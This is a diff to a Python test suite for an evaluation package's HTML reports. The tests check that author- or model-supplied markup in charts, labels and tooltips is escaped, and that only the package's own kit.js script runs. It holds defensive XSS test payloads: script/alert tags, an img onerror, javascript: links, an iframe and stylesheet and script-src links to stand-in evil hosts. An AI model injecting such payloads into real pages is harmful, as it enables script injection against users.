@@ -1,11 +1,12 @@
-"""The report's HTML runs no script, and nothing an author wrote can make it run or load anything.
+"""The report's HTML runs one script, the kit's own, and nothing an author wrote can make it run or load anything.
 
-The principle: nothing an author or a model wrote can make the page run or load anything; the package itself may
-load the kit's fonts from the Google Fonts hosts, so the page is set in the faces the kit's reference memos use.
-That is the whole of what the page loads: three links the package writes into its head, a preconnect to each host
-and one stylesheet, matched attribute for attribute (:mod:`~packages.evals.tests.page_contract_support`). Any other
-``<link>``, any ``<script>`` (the page has none of its own), any element that embeds or loads, any ``on*``
-attribute and any ``javascript:`` URL is refused.
+The principle: nothing an author or a model wrote can make the page run or load anything. The package itself writes
+two things that do (:mod:`~packages.evals.tests.page_contract_support`): the kit's fonts, three links in the head, a
+preconnect to each Google Fonts host and one stylesheet, matched attribute for attribute; and the kit's script, one
+``<script>`` at the end of the body whose text is byte for byte the ``kit.js`` the package ships, which draws each
+chart from the JSON in its ``data-chart``. Any other ``<link>``, any other ``<script>`` (a second copy of the kit, one
+with a ``src``, one whose text differs), any element that embeds or loads, any ``on*`` attribute and any
+``javascript:`` URL outside a ``data-*`` attribute is refused.
 
 Read by parsing the page, not by searching its text: an element is a ``<script>`` because the parser opened one,
 and a string that merely contains the word does not count either way. Checked on the toy host's real report and on
@@ -13,15 +14,25 @@ a report whose author wrote markup into every field a model fills — a script, 
 iframe, a stylesheet link to another host and a copy of the package's own font link — the case the property exists
 for, since a page that loads only its own fonts while its prose is polite does not keep it. A campaign's page is held
 to the same case: its campaign name, arm labels, aspect labels, fold lines, memo and folded pages all carry the
-markup, since it lays out each aspect's page again and rewrites the ids and links in it. The charts are inline SVG
-the package draws, and are held to the same rules.
+markup, since it lays out each aspect's page again and rewrites the ids and links in it.
+
+A chart's labels, titles, tooltips and every other string in its data reach the page only as JSON in its
+``data-chart`` attribute, escaped there, so markup in them is never markup on the page; and once the kit has drawn the
+charts in headless Chromium (``integration``), no element of the injected markup exists in the document and every
+tooltip holds nothing but text.
 """
 
 from __future__ import annotations
 
+import json
+import re
+from pathlib import Path
 from typing import Any
 
+import pytest
+
 from threetears.evals.analysis import (
+    KIT_CHARTS,
     CampaignReport,
     build_campaign_report,
     build_code_only_report,
@@ -35,7 +46,15 @@ from threetears.evals.kernel.declaration import CampaignArm
 from packages.evals.tests.campaign_page_support import campaign_fixture, two_aspect_memo
 from packages.evals.tests.campaign_support import ASSEMBLED_AT
 from packages.evals.tests.fixtures.toyhost.campaign import toyhost_bundle
-from packages.evals.tests.page_contract_support import FONT_LINK_MARKUP, FONT_LINKS, font_links, parsed, what_runs
+from packages.evals.tests.page_contract_support import (
+    FONT_LINK_MARKUP,
+    FONT_LINKS,
+    KIT_JS,
+    font_links,
+    parsed,
+    what_runs,
+)
+from packages.evals.tests.report_kit_support import chromium_unavailable, rendered
 from packages.evals.tests.report_support import toy_report
 
 #: What an author might write into a field a model fills, to try to make the page run or load something: a script,
@@ -45,6 +64,222 @@ _HOSTILE = (
     '<script>alert(1)</script><img src=x onerror="alert(2)"><a href="javascript:alert(3)">x</a>'
     '<iframe src=//evil></iframe><link rel="stylesheet" href="https://evil.example/x.css">' + FONT_LINK_MARKUP
 )
+
+
+def _hostile_kit_charts() -> list[dict[str, Any]]:
+    """A chart of each of the kit's fourteen kinds whose every string the kit draws carries markup: titles, labels,
+    short labels, tags, notes, tooltips, legend entries, panel titles, column headings, pill words (a lattice's built
+    as markup by ``pill()``), reasons, region labels, a confusion matrix's labels and an example card's every part."""
+    h = _HOSTILE
+    chart = {"kind": "chart", "section": "memo", "finding": 0, "title": h}
+    return [
+        {
+            "kind": "chart",
+            "section": "memo",
+            "finding": 0,
+            "chart": "bars",
+            "title": h,
+            "data": {
+                "domain": [0, 10],
+                "fmt": "int",
+                "level": "95%",
+                "legend": [{"label": h, "color": "--s1"}],
+                "reference": {"value": 5, "label": h, "kind": "floor"},
+                "rows": [
+                    {"label": h, "short_label": h, "value": 4, "lo": 3, "hi": 6, "note": h, "tip": [h, h], "group": h},
+                    {
+                        "label": h,
+                        "tag": h,
+                        "segments": [{"value": 2, "color": "--bad", "pattern": "hatch"}],
+                        "tip": [h],
+                    },
+                ],
+            },
+        },
+        {
+            **chart,
+            "chart": "diverging_bars",
+            "data": {
+                "domain": [-10, 10],
+                "fmt": "+pts",
+                "reference": {"value": 0, "label": h, "kind": "no_preference"},
+                "legend": [{"label": h, "color": "--bad", "mark": "square", "pattern": "dots"}],
+                "rows": [{"label": h, "short_label": h, "value": -4, "note": h, "tip": [h], "group": h}],
+            },
+        },
+        {
+            **chart,
+            "chart": "forest",
+            "data": {
+                "domain": [-10, 10],
+                "fmt": "+pts",
+                "level": h,
+                "reference": {"value": 2, "label": h, "kind": "margin"},
+                "rows": [
+                    {"label": h, "short_label": h, "value": 1, "lo": -2, "hi": 4, "note": h, "tip": [h], "group": h}
+                ],
+            },
+        },
+        {
+            **chart,
+            "chart": "dot_interval",
+            "data": {
+                "domain": [0, 100],
+                "fmt": "pct",
+                "level": h,
+                "reference": {"value": 80, "label": h, "kind": "floor"},
+                "rows": [{"label": h, "value": 85, "lo": 80, "hi": 90, "tip": [h]}, {"label": h, "value": 70}],
+            },
+        },
+        {
+            **chart,
+            "chart": "range_bars",
+            "data": {
+                "domain": [0, 10],
+                "fmt": "s",
+                "reference": {"value": 5, "label": h, "kind": "budget"},
+                "legend": [{"label": h}],
+                "groups": [{"label": h, "short_label": h, "rows": [{"label": h, "from": 1, "to": 3, "tip": [h]}]}],
+            },
+        },
+        {
+            **chart,
+            "chart": "gate_scatter",
+            "data": {
+                "x_domain": [0, 10],
+                "y_domain": [0, 100],
+                "x_fmt": "usd",
+                "y_fmt": "pct",
+                "region_label": h,
+                "reference": {"value": 80, "label": h, "kind": "floor"},
+                "x_reference": {"value": 5, "label": h, "kind": "budget"},
+                "points": [{"x": 2, "y": 90, "label": h, "narrow_label": h, "tip": [h]}],
+            },
+        },
+        {
+            **chart,
+            "chart": "lattice",
+            "data": {
+                "fmt": "pct",
+                "cost_fmt": "usd",
+                "cost_unit": h,
+                "latency_fmt": "s",
+                "bar_domain": [0, 100],
+                "columns": [{"label": h}],
+                "rows": [
+                    {
+                        "label": h,
+                        "color": "--s1",
+                        "cells": [
+                            {"value": 80, "cost": 1, "latency": 2, "status": "bad", "status_label": h, "tip": [h]}
+                        ],
+                    }
+                ],
+            },
+        },
+        {
+            **chart,
+            "chart": "diff_heatmap",
+            "data": {
+                "fmt": "+pts",
+                "detail_fmt": "pct",
+                "columns": [{"label": h}],
+                "rows": [{"label": h, "cells": [{"value": 3, "detail": 80, "tip": [h]}]}],
+            },
+        },
+        {**chart, "chart": "confusion", "data": {"labels": [h, h], "matrix": [[90, 10], [5, 95]]}},
+        {
+            "kind": "chart",
+            "section": "memo",
+            "finding": 0,
+            "chart": "scatter_frontier",
+            "title": h,
+            "data": {
+                "x_domain": [0, 10],
+                "y_domain": [0, 100],
+                "x_fmt": "usd",
+                "y_fmt": "pct",
+                "x_title": h,
+                "y_title": h,
+                "price_line": {"value": 2, "label": h, "region_label": h},
+                "points": [
+                    {"x": 2, "y": 80, "id": "a", "label": h, "narrow_label": h, "tip": [h]},
+                    {"x": 6, "y": 90, "id": "b", "label": h, "narrow_label": h, "tip": [h]},
+                ],
+            },
+        },
+        {
+            "kind": "chart",
+            "section": "memo",
+            "finding": 0,
+            "chart": "gate_matrix",
+            "title": h,
+            "data": {
+                "row_header": h,
+                "pick_label": h,
+                "cost_fmt": "usd",
+                "cost_unit": h,
+                "columns": [{"label": h}],
+                "rows": [
+                    {
+                        "label": h,
+                        "detail": h,
+                        "flag": h,
+                        "cells": [{"status": "bad", "label": h, "reasons": [h], "cost": 1, "pick": True}],
+                    }
+                ],
+            },
+        },
+        {
+            "kind": "chart",
+            "section": "memo",
+            "finding": 0,
+            "chart": "heatmap",
+            "title": h,
+            "data": {
+                "domain": [0, 100],
+                "fmt": "pct",
+                "columns": [{"label": h}],
+                "panels": [
+                    {"title": h, "subtitle": h, "rows": [{"label": h, "cells": [{"value": 50, "tip": [h]}]}]},
+                    {"title": h, "subtitle": h},
+                ],
+            },
+        },
+        {
+            "kind": "chart",
+            "section": "memo",
+            "finding": 0,
+            "chart": "examples",
+            "title": h,
+            "data": {
+                "cards": [
+                    {
+                        "meta": [{"text": h, "mono": True}, {"status": "bad", "label": h}, {"tag": h, "label": h}],
+                        "question": h,
+                        "fields": [{"term": h, "text": h, "tone": "bad"}],
+                        "reason": h,
+                        "excerpt": h,
+                        "note": h,
+                    }
+                ]
+            },
+        },
+        {
+            "kind": "chart",
+            "section": "memo",
+            "finding": 0,
+            "chart": "lines",
+            "title": h,
+            "data": {
+                "categories": [h, h],
+                "domain": [0, 100],
+                "fmt": "pct",
+                "x_title": h,
+                "series": [{"name": h, "end_label": h, "values": [40, 60]}],
+            },
+        },
+    ]
 
 
 def _hostile_report() -> Report:
@@ -96,6 +331,7 @@ def _hostile_report() -> Report:
                 "rows": [{"label": _HOSTILE, "value": 1.0, "low": 0.5, "high": 1.5, "n_cases": 6, "verdict": _HOSTILE}],
                 "unit": _HOSTILE,
             },
+            *_hostile_kit_charts(),
             {
                 "kind": "table",
                 "section": "cases",
@@ -211,6 +447,8 @@ async def test_markup_a_host_or_a_model_put_on_a_campaign_page_is_text_not_marku
     assert any("<script>alert(1)</script>" in text for text in read.text), "the words survive as text"
     assert any('onerror="alert(4)"' in text for text in read.text)
     assert any(_HOSTILE_ASPECT in text for text in read.text), "the aspect's label is words too"
+    drawn = [text for _, data in _chart_data(page) for text in _strings(data)]
+    assert any(text.startswith(_HOSTILE_LINE) for text in drawn), "an arm's label reaches its chart as words"
     assert any(FONT_LINK_MARKUP.split(">", 1)[0] in text for text in read.text), "so is the copied font link"
     assert page.count("&lt;script&gt;alert(1)&lt;/script&gt;") > 10, "every field's markup is escaped"
     ids = [value for _, attrs in read.tags for name, value in attrs if name == "id"]
@@ -219,12 +457,15 @@ async def test_markup_a_host_or_a_model_put_on_a_campaign_page_is_text_not_marku
     assert {href[1:] for href in hrefs} <= set(ids), "a link lands nowhere"
 
 
-async def test_the_toy_reports_html_contains_no_script_element() -> None:
-    """Done when: the HTML contains no script element."""
+async def test_the_toy_report_s_html_carries_the_kit_s_script_and_no_other() -> None:
+    """Done when: the HTML's one script element is the kit's, verbatim, last on the page."""
     _, _, report = await toy_report()
     page = report_html(report)
+    read = parsed(page)
 
-    assert not [tag for tag, _ in parsed(page).tags if tag == "script"]
+    assert [tag for tag, _ in read.tags if tag == "script"] == ["script"]
+    assert list(read.scripts.values()) == [KIT_JS], "the script is the shipped kit.js, byte for byte"
+    assert read.tags[-1] == ("script", []), "with no attribute, after every other element"
     assert what_runs(page) == []
     assert font_links(page) == list(FONT_LINKS), "the page loads the kit's fonts and nothing else"
     assert page.index(FONT_LINK_MARKUP) < page.index("</head>"), "the font links are in the head, verbatim"
@@ -268,16 +509,86 @@ def test_the_markdown_a_memo_uses_still_renders() -> None:
     assert {"ul", "li", "strong", "code"} <= set(tags)
 
 
-def test_a_chart_draws_the_labels_it_is_given_as_text() -> None:
+def _chart_data(page: str) -> list[tuple[str, Any]]:
+    """Every chart the page hands the kit: its kind and its data, read from the attributes as a browser reads them."""
+    return [
+        (dict(attrs)["data-kind"] or "", json.loads(dict(attrs)["data-chart"] or ""))
+        for tag, attrs in parsed(page).tags
+        if tag == "div" and "data-chart" in dict(attrs)
+    ]
+
+
+def _strings(value: Any) -> list[str]:
+    """Every string in a JSON value."""
+    if isinstance(value, dict):
+        return [text for item in value.values() for text in _strings(item)]
+    if isinstance(value, list):
+        return [text for item in value for text in _strings(item)]
+    return [value] if isinstance(value, str) else []
+
+
+def test_a_chart_carries_the_labels_it_is_given_as_escaped_text_in_its_data() -> None:
     page = report_html(_hostile_report())
-    assert page.count("<svg") == 2
-    svg_text = [text for text in parsed(page).text if "<script>alert(1)</script>" in text]
-    assert len(svg_text) > 4, "every label, title and description survives as words"
+    charts = _chart_data(page)
+    kinds = [kind for kind, _ in charts]
+    assert kinds == ["bars", *(chart["chart"] for chart in _hostile_kit_charts())]
+    assert set(kinds) == set(KIT_CHARTS), "every kind the kit draws"
+    for kind, data in charts:
+        assert _HOSTILE in _strings(data), f"a {kind} chart's labels survive as words"
+    # In the markup the JSON is escaped into its double-quoted attribute: not one raw angle bracket or quote in it.
+    raw = re.findall(r'data-chart="([^"]*)"', page)
+    assert len(raw) == len(charts) and all(not set("<>'") & set(value) for value in raw)
+    assert "<script>alert(1)</script>" not in page.replace(KIT_JS, "")
+
+
+def test_interval_rows_reach_the_page_as_their_table_alone() -> None:
+    """Interval rows name no interval level, and the kit never draws an interval without one: their figure holds
+    their table and no chart."""
+    page = report_html(_hostile_report())
+    figure = page[page.index('data-figure="interval_rows"') :]
+    figure = figure[: figure.index("</figure>")]
+    assert 'class="chart"' not in figure and 'class="tbl chart-values"' in figure
+
+
+@pytest.mark.integration
+def test_once_the_kit_has_drawn_the_charts_no_injected_markup_is_an_element(tmp_path: Path) -> None:
+    """In headless Chromium, after the kit has drawn every chart of the hostile report: the page holds its one
+    script, no element the markup in the labels tried to add, every chart drawn with no error, the injected markup
+    present as words, and every tooltip nothing but text (the first line bold)."""
+    reason = chromium_unavailable()
+    if reason is not None:
+        pytest.skip(f"headless Chromium cannot launch: {reason}")
+    page = tmp_path / "hostile.html"
+    page.write_text(report_html(_hostile_report()), encoding="utf-8")
+    probe = """() => {
+      const charts = [...document.querySelectorAll('div.chart[data-kind]')];
+      const tips = [...document.querySelectorAll('[data-tip]')].flatMap(e => {
+        const t = document.createElement('template'); t.innerHTML = e.getAttribute('data-tip');
+        return [...t.content.querySelectorAll('*')].map(x => x.tagName.toLowerCase()); });
+      return {
+        scripts: document.scripts.length,
+        injected: [...document.querySelectorAll('img, iframe, link, [onerror], [onload], a[href^="javascript"], svg svg')]
+          .filter(e => !(e.tagName === 'LINK' && e.parentElement === document.head)).map(e => e.outerHTML.slice(0, 80)),
+        charts: charts.length,
+        undrawn: charts.filter(c => !c.children.length).map(c => c.dataset.kind),
+        words: charts.filter(c => c.textContent.includes('<script>alert(1)</script>')).length,
+        tips: [...new Set(tips)].sort(),
+        tipCount: document.querySelectorAll('[data-tip]').length,
+      };
+    }"""
+    seen, errors = rendered(page, probe)
+    assert errors == []
+    assert seen["scripts"] == 1
+    assert seen["injected"] == []
+    assert seen["charts"] == 1 + len(KIT_CHARTS) and seen["undrawn"] == []
+    assert seen["words"] >= 5, "the markup is drawn as words"
+    assert seen["tipCount"] > 0 and set(seen["tips"]) <= {"b", "br"}
 
 
 def test_the_check_sees_a_script_where_one_is() -> None:
     """A detector that found nothing anywhere would pass every page above for nothing."""
     assert what_runs("<p>x</p><script>1</script>") == ["<script>"]
+    assert what_runs(f"<p>x</p><script>{KIT_JS}</script>") == []
     assert what_runs('<p onclick="x">y</p>') == ["p[onclick]"]
     assert what_runs('<a href=" JavaScript:x">y</a>') == ["a[href]", "a[href=javascript:]"]
     assert what_runs('<a href="java\tscript:x">y</a>') == ["a[href]", "a[href=javascript:]"]
@@ -319,15 +630,35 @@ _LOADERS: list[tuple[str, list[str]]] = [
 ]
 
 
+#: One small page per way a script could pass for the kit's, and what the check names on it: the kit's own passes
+#: only alone, attribute-less, in the body, last, byte for byte.
+_SCRIPTS: list[tuple[str, list[str]]] = [
+    (f"<p>x</p><script>{KIT_JS}</script><script>{KIT_JS}</script>", ["<script>", "<script>"]),
+    (f"<p>x</p><script>alert(1)</script><script>{KIT_JS}</script>", ["<script>", "<script>"]),
+    (f'<p>x</p><script src="https://evil.example/kit.js">{KIT_JS}</script>', ["<script>", "script[src]"]),
+    (f'<p>x</p><script type="module">{KIT_JS}</script>', ["<script>"]),
+    (f"<p>x</p><script>{KIT_JS} </script>", ["<script>"]),
+    (f"<p>x</p><script>{KIT_JS.replace('drawCharts', 'drawCharts2', 1)}</script>", ["<script>"]),
+    (f"<p>x</p><script>{KIT_JS}</script><p>y</p>", ["<script>"]),
+    (f"<html><head><script>{KIT_JS}</script></head><body><p>x</p></body></html>", ["<script>"]),
+]
+
+
+def test_the_check_passes_the_kit_s_script_only_alone_verbatim_and_last() -> None:
+    for page, refused in _SCRIPTS:
+        assert what_runs(page) == refused, page[:60]
+
+
 def test_the_check_refuses_every_element_and_attribute_that_loads_embeds_or_navigates() -> None:
     """Each page holds one offender, and the check names it; the font links pass only in the head."""
     for page, refused in _LOADERS:
         assert what_runs(page) == refused, page
 
 
-def test_the_check_passes_a_page_that_loads_only_the_font_links() -> None:
+def test_the_check_passes_a_page_that_loads_only_the_font_links_and_runs_only_the_kit() -> None:
     """A page as the package writes one: the font links in the head, links to places on the page, inline SVG with a
-    title, a ``data-*`` attribute, a style attribute naming no URL and the word ``url(`` in prose."""
+    title, a ``data-*`` attribute, a chart whose JSON carries a ``javascript:`` string as data, a style attribute
+    naming no URL, the word ``url(`` in prose, and the kit's script last."""
     page = (
         '<!doctype html><html lang="en"><head><meta charset="utf-8"><title>t</title>'
         + FONT_LINK_MARKUP
@@ -335,7 +666,8 @@ def test_the_check_passes_a_page_that_loads_only_the_font_links() -> None:
         '<nav><a href="#memo">Memo</a></nav><article data-basis="analysis"><section id="memo">'
         '<p style="--w: 3">Read url(x) and javascript: in prose.</p><a href="#g-interval" title="t">interval</a>'
         '<svg viewBox="0 0 10 10" role="img"><title>bar</title><rect width="5" height="5"></rect></svg>'
-        "</section></article></body></html>"
+        '<div class="chart" data-kind="bars" data-chart="{&quot;note&quot;:&quot;javascript:x&quot;}"></div>'
+        f"</section></article><script>{KIT_JS}</script></body></html>"
     )
     assert what_runs(page) == []
     assert font_links(page) == list(FONT_LINKS)
